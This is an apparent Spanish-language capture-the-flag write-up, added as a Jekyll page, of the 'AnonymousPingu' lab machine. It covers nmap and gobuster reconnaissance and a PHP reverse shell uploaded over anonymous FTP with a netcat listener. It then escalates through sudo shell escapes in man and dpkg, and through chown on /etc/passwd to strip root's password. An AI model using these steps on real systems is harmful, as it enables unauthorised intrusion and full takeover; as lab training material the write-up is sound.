@@ -1,0 +1,280 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset='utf-8'>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/assets/css/style.css?v=5fdc73dbc748710b5d954669c64acfd639531df9">
+    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->
+
+<!-- Setup theme-color -->
+<!-- start theme color meta headers -->
+<meta name="theme-color" content="#151515">
+<meta name="msapplication-navbutton-color" content="#151515">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<!-- end theme color meta headers -->
+
+
+<!-- Setup Google Analytics -->
+
+
+
+<!-- You can set your favicon here -->
+<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->
+
+<!-- end custom head snippets -->
+
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Anonymouspingu | Mi Sitio Hacker</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="Anonymouspingu" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Reconocimiento" />
+<meta property="og:description" content="Reconocimiento" />
+<link rel="canonical" href="http://localhost:4000/2024/11/30/AnonymousPingu.html" />
+<meta property="og:url" content="http://localhost:4000/2024/11/30/AnonymousPingu.html" />
+<meta property="og:site_name" content="Mi Sitio Hacker" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-11-30T00:00:00-05:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Anonymouspingu" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2024-11-30T00:00:00-05:00","datePublished":"2024-11-30T00:00:00-05:00","description":"Reconocimiento","headline":"Anonymouspingu","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2024/11/30/AnonymousPingu.html"},"url":"http://localhost:4000/2024/11/30/AnonymousPingu.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+  </head>
+
+  <body>
+
+    <header>
+      <div class="container">
+        <a id="a-title" href="/">
+          <h1>Mi Sitio Hacker</h1>
+        </a>
+        <h2>Un sitio con estilo hacker para pentesting y labs.</h2>
+
+        <section id="downloads">
+          
+          <a href="https://github.com/kamilfire/kamilfire.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
+        </section>
+      </div>
+    </header>
+
+    <div class="container">
+      <section id="main_content">
+        <small>30 November 2024</small>
+<h1>Anonymouspingu</h1>
+
+<p class="view">by </p>
+
+
+<p>Reconocimiento</p>
+
+<p>Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. Descubrimos que los puertos que se encuentran activos son el 21 (FTP) y el 80 (HTTP).</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">-p-</code>: Escanea todos los puertos (1-65535).</li>
+  <li><code class="language-plaintext highlighter-rouge">--open</code>: Solo muestra los puertos abiertos.</li>
+  <li><code class="language-plaintext highlighter-rouge">-sS</code>: Realiza un escaneo SYN, que es rápido y discreto.</li>
+  <li><code class="language-plaintext highlighter-rouge">--min-rate=5000</code>: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.</li>
+  <li><code class="language-plaintext highlighter-rouge">-n</code>: No realiza resolución DNS.</li>
+  <li><code class="language-plaintext highlighter-rouge">-Pn</code>: No realiza ping previo para determinar si el host está activo.</li>
+  <li><code class="language-plaintext highlighter-rouge">-vvv</code>: Muestra resultados detallados y en tiempo real.</li>
+</ul>
+
+<p><img src="https://github.com/user-attachments/assets/fbdcf75b-e25d-4d92-8797-3e558b2a92e6" alt="image" /></p>
+
+<p>A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p 21,80 -sCV 172.17.0.2 -oG targeted
+</code></pre></div></div>
+
+<p><img src="https://github.com/user-attachments/assets/35d4dab8-0433-48d9-9943-52e4e2a36bfd" alt="image" /></p>
+
+<p>Exploración Web</p>
+
+<p>Al acceder a la página web, observamos lo siguiente:</p>
+
+<p><img src="https://github.com/user-attachments/assets/ede1f8d5-c313-4e69-94ee-aee4e813aa5e" alt="image" /></p>
+
+<p>Utilizamos <code class="language-plaintext highlighter-rouge">Gobuster</code> para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">gobuster dir</code> - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.</li>
+  <li><code class="language-plaintext highlighter-rouge">-u http://172.17.0.2/</code> Especifica la URL objetivo que deseas escanear en busca de directorios.</li>
+  <li><code class="language-plaintext highlighter-rouge">-w</code> Especifica que diccionario queremos usar</li>
+  <li><code class="language-plaintext highlighter-rouge">-x</code> Para indicar que tipo de extension queremos que nos encuentre</li>
+</ul>
+
+<p><img src="https://github.com/user-attachments/assets/7684d11b-a469-40f3-8254-b0d964ec0112" alt="image" /></p>
+
+<p>Vemos que hay un directorio upload pero no hay nada dentro.</p>
+
+<p><img src="https://github.com/user-attachments/assets/d2061512-4cf0-4b1a-90a6-0abaad99a259" alt="image" /></p>
+
+<h2 id="ftp">FTP</h2>
+
+<p>Procedemos a explorar el servicio FTP, ya que hemos identificado anteriormente que el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> está habilitado y que tenemos permisos de escritura en el directorio <code class="language-plaintext highlighter-rouge">upload</code>.</p>
+
+<p><strong>Nota:</strong> Los usuarios <code class="language-plaintext highlighter-rouge">anonymous</code> no suelen tener contraseñas o son opcionales en muchos servidores FTP.</p>
+
+<p>A continuación, intentamos conectarnos al servidor FTP utilizando el siguiente comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp 172.17.0.2
+</code></pre></div></div>
+
+<p>Al intentar acceder al servidor FTP con el usuario <code class="language-plaintext highlighter-rouge">anonymous</code> y sin contraseña, observamos que podemos entrar perfectamente.</p>
+
+<p><img src="https://github.com/user-attachments/assets/ea8254c0-879e-4ece-b542-3f19975c77a5" alt="image" /></p>
+
+<p>Intrusión en la Máquina</p>
+
+<p>Generamos la reverseshell utilizando <strong>Pentest Monkey</strong>, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:</p>
+
+<p><a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">Reverseshell de Pentest Monkey</a></p>
+
+<p>Pasos para Cargar la Reverseshell</p>
+
+<ol>
+  <li><strong>Preparar la Reverseshell</strong>: Creamos un archivo de reverseshell en nuestro sistema local utilizando el código disponible en la ruta mencionada anteriormente.</li>
+  <li><strong>Subir el Archivo</strong>: Utilizamos el comando de FTP para subir el archivo al directorio <code class="language-plaintext highlighter-rouge">upload</code>.</li>
+  <li><strong>Ejecutar la Reverseshell</strong>: Una vez que el archivo esté en el servidor, lo ejecutaremos para establecer la conexión.</li>
+</ol>
+
+<p><img src="https://github.com/user-attachments/assets/c6b9c6c5-e334-466c-ac7c-931e21464118" alt="image" /></p>
+
+<p>Nos ponemos a escuchar por netcat en mi caso por el 4444</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lvnp 4444
+</code></pre></div></div>
+
+<p>Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell:</p>
+
+<p><img src="https://github.com/user-attachments/assets/efce64bc-e77c-42cb-8b26-c651f630a409" alt="image" /></p>
+
+<p>Y ya tendriamos acceso a la maquina.</p>
+
+<p><img src="https://github.com/user-attachments/assets/bbc7b73c-09e9-4095-a526-e827fdead208" alt="image" /></p>
+
+<p>TTY ReverseShell</p>
+
+<h3 id="iniciar-una-sesión-de-shell-interactiva">Iniciar una sesión de shell interactiva</h3>
+
+<p>En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash
+</code></pre></div></div>
+
+<h3 id="suspender-la-shell">Suspender la shell</h3>
+
+<p>Una vez que el comando anterior está en ejecución, utilizamos</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Control+Z
+</code></pre></div></div>
+
+<p>para suspender temporalmente nuestra shell.</p>
+
+<h3 id="preparar-nuestro-terminal-local">Preparar nuestro terminal local:</h3>
+
+<p>Antes de volver a nuestra shell, configuramos nuestro terminal local:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty raw -echo; fg
+</code></pre></div></div>
+
+<h3 id="resetear-la-configuración-del-terminal">Resetear la configuración del terminal</h3>
+
+<p>Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reset
+</code></pre></div></div>
+
+<h3 id="configura-el-tipo-de-terminal">Configura el tipo de terminal:</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xterm
+export TERM=xterm
+export SHELL=bash
+</code></pre></div></div>
+
+<h2 id="usuario-pingu">Usuario pingu</h2>
+
+<p>Ya estamos dentro de la máquina. Si ejecutamos el comando <code class="language-plaintext highlighter-rouge">sudo -l</code>, vemos que podemos ejecutar <code class="language-plaintext highlighter-rouge">man</code> como <code class="language-plaintext highlighter-rouge">Pingu</code>. Para ello, debemos hacer lo siguiente:</p>
+
+<p><img src="https://github.com/user-attachments/assets/cef8486b-9c3c-4905-90b8-1dc9d1c54986" alt="Interfaz de la herramienta" /></p>
+
+<p>Esta herramienta tiene una sección al final que muestra <code class="language-plaintext highlighter-rouge">MORE</code>. Si en lugar de desplazarnos hacia abajo, escribimos <code class="language-plaintext highlighter-rouge">!/bin/bash</code>, se generará una shell con ese usuario.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u pingu man man
+</code></pre></div></div>
+
+<p><img src="https://github.com/user-attachments/assets/7300b460-b586-4311-b862-5bd5df506bd4" alt="image" /></p>
+
+<p>Si ahora ponemos <code class="language-plaintext highlighter-rouge">!/bin/bash</code>:</p>
+
+<p><img src="https://github.com/user-attachments/assets/eb9e8678-2261-4e21-96bc-9a49f19abafc" alt="image" /></p>
+
+<p>Vemos que hemos subido de usuario y ya estamos con el usuario <code class="language-plaintext highlighter-rouge">pingu</code>.</p>
+
+<p><img src="https://github.com/user-attachments/assets/0c3da884-f0fb-45df-9692-59312d0752ab" alt="Cambio de usuario" /></p>
+
+<h2 id="usuario-gladys">Usuario gladys</h2>
+
+<p>Vamos a volver a ejecutar el comando <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+
+<p><img src="https://github.com/user-attachments/assets/0cedf58f-0919-4d19-a6eb-c37df62b1d4b" alt="Comando sudo" /></p>
+
+<p>Observamos que podemos ejecutar <code class="language-plaintext highlighter-rouge">nmap</code> y <code class="language-plaintext highlighter-rouge">dpkg</code> como <code class="language-plaintext highlighter-rouge">gladys</code>. En mi caso, utilizaré <code class="language-plaintext highlighter-rouge">dpkg</code> y aplicaré el mismo método que antes con <code class="language-plaintext highlighter-rouge">man</code>. En mi caso, utilizaré <code class="language-plaintext highlighter-rouge">dpkg</code> y aplicaré el mismo método que antes con <code class="language-plaintext highlighter-rouge">man</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -u gladys /usr/bin/dpkg -l
+</code></pre></div></div>
+
+<p>Si ahora ponemos <code class="language-plaintext highlighter-rouge">!/bin/bash</code>:</p>
+
+<p><img src="https://github.com/user-attachments/assets/7f86e264-8d5c-4fb9-8302-0177b78e7dbf" alt="image" /></p>
+
+<p>Vemos que hemos subido de usuario y ya estamos con el usuario <code class="language-plaintext highlighter-rouge">gladys</code>.</p>
+
+<p><img src="https://github.com/user-attachments/assets/0e482934-f8cd-4cd1-bede-abf6bd888fa6" alt="image" /></p>
+
+<h2 id="usuario-root">Usuario root</h2>
+
+<p>Vamos a volver a ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+
+<p><img src="https://github.com/user-attachments/assets/fb5bbc2b-bd10-4091-bb4c-a9b168f0d487" alt="image" /></p>
+
+<p>Observamos que podemos ejecutar <code class="language-plaintext highlighter-rouge">chown</code> como <code class="language-plaintext highlighter-rouge">root</code>. Para ello, procedemos de la siguiente manera:</p>
+
+<p>Primero cambiamos los permisos de <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para que nuestro usuario tenga permisos:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LFILE=/etc/passwd
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/chown gladys:gladys $LFILE
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat /etc/passwd
+</code></pre></div></div>
+
+<p>se copia lo guardado en el directorio passwd y se modifica donde esta root se quita el caracter x se guarda en el portapapeles</p>
+
+<p>y usamos el comando  <code class="language-plaintext highlighter-rouge">echo 'se pega lo que esta en portapapeles'&gt; /etc/passwd</code></p>
+
+<p>Ahora hacemos un <code class="language-plaintext highlighter-rouge">su root</code> y accederemos al usuario <em>root</em> sin proporcionar contraseña</p>
+
+<p><img src="https://github.com/user-attachments/assets/45c469ca-e1f3-4c7a-8025-920b591e5324" alt="image" />z</p>
+
+
+
+  <small>tags: <em></em></small>
+
+
+      </section>
+    </div>
+  </body>
+</html>
